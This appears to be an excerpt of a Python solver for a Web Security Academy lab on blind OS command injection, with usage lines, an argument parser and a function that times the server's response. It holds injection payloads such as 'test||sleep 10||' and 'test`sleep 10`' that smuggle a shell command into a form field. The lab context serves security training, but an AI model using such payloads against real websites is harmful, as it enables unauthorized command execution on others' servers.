...
Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test||sleep 10||" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test||sleep 10||" 

Example solutions: test||sleep 10||, test`sleep 10`
...
parser.add_argument('-c', '--command', help='Command to run, Example: ||sleep 10||, `sleep 10`', required=True)
...
def cmd_inj(s, url, command, csrf):
    ...
    if args.proxy:
        ...
        # verify the response is 10 seconds or more late
        if (r.elapsed.total_seconds() >= 10):
            print("Total time for response: ")
